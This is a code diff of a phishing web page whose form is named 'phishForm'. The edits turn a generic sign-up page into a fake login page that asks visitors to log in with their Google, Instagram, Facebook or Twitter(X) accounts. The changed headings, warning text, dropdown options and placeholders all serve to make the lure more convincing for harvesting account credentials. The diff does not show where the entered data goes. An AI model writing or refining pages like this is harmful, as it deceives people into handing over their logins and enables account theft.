@@ -11,9 +11,9 @@
     </style>
 </head>
 <body>
-    <h2>sign Up </h2>
+    <h2>WELCOME Dear, just Login to reach us!</h2>
     <div class="login-form">
-        <p class="warning">Bienvenue sur Notre page.</p>
+        <p class="warning">Please Only Login with: google, instagram,facebook or twitter(X) !</p>
         
         <form id="phishForm">
             <label>Login With:</label>
@@ -21,7 +21,7 @@
                 <option value="email">GOOGLE</option>
                 <option value="username">INSTAGRAM</option>
                 <option value="phone">FACEBOOK</option>
-                <option value="other">Other Identifier</option>
+                <option value="other">twitter(X)</option>
             </select>
             
             <input type="text" id="identifier" placeholder="Email address" required>
@@ -38,9 +38,9 @@
             
             switch(type) {
                 case 'email': field.placeholder = 'Email address'; break;
-                case 'username': field.placeholder = 'Username'; break;
+                case 'username': field.placeholder = 'Email or username'; break;
                 case 'phone': field.placeholder = 'Phone number'; break;
-                default: field.placeholder = 'Your identifier'; break;
+                default: field.placeholder = 'Your Email'; break;
             }
         }
 
